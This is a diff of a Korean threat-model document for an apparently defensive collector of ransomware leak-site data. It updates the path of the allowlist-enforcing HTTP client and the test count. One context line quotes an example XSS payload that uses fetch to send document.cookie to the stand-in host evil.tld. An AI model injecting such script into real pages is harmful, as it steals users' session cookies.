@@ -15,7 +15,7 @@
   └──────────────────────────────┬────────────────────────────────────────────┘
                                  │  HTTPS · 허용목록 · 크기상한 · 타입검사
   ┌──────────────────────────────▼───── 신뢰 경계 (여기서 전부 살균) ──────────┐
-  │  collector/http_client.py  →  collector/sources/base.py (finalize)         │
+  │  packages/dc_safety/http.py  →  collector/sources/base.py (finalize)       │
   └──────────────────────────────┬────────────────────────────────────────────┘
                                  │  살균된 평문만 통과
   ┌──────────────────────────────▼──────── 신뢰 영역 ─────────────────────────┐
@@ -36,7 +36,7 @@
 |---|---|
 | **위험** | .onion 접속 시 브라우저/클라이언트 취약점 공격, 악성 파일 자동 다운로드, 접속 로그 노출 |
 | **대응** | 기본 모드는 **.onion 에 전혀 접속하지 않음.** Tor 설치 자체가 불필요 |
-| **강제 지점** | `collector/http_client.py` — `ALLOWED_HOSTS` 에 `.onion` 이 없고 `_check_host()` 가 HTTPS + 허용목록을 강제 |
+| **강제 지점** | `packages/dc_safety/http.py` — `ALLOWED_HOSTS` 에 `.onion` 이 없고 `_check_host()` 가 HTTPS + 허용목록을 강제. `collector/http_client.py` 는 이 이름을 넘겨주는 껍데기 |
 | **예외 경로** | `tor/onion_crawler.py` — 3중 게이트(§2)를 모두 통과해야만 동작 |
 
 ### T2. SSRF / 네트워크 피벗
@@ -192,7 +192,7 @@ DLS 게시물 제목에 `</script><script>fetch('http://evil.tld/'+document.cook
 
 ```bash
 python -m collector.main doctor    # 현재 환경 · 허용목록 · Tor 게이트 상태
-python -m tests.test_all           # 84개 보안·기능 테스트
+python -m tests.test_all           # 149개 보안·기능 테스트
 ```
 
 ---
